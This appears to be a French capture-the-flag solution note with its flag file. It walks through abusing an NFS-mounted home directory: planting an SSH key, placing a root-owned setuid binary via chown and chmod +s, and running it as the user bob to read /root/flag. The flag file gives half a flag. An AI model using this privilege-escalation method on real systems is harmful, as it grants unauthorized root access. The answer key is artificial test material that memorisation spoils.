--- Solution ---
- Monter le nfs de /home/bob
- Créer une clef ssh et copier la clef publique dans <point de montage>/.ssh.authorized_keys
- Se connecter en ssh
- Compiler cuck.c et mettre l'exécutable sur le nfs (/home/bob)
- Supposant qu'on est root sur notre machine, on exécute :
	~# chown root:root cuck
	~# chmod +s cuck
- Se connecter en SSH en tant que bob et exécuter cuck
	~# id
	~# cat /root/flag

--- flag.txt ---
Pas mal!!!

Bon, par contre, c'était la version facile, 
donc ça vous donne juste la moitié du flag.

voici le début du flag:
 wsdlkfjvze.............

Le flag complet sera révélé dans la version 
difficile :p
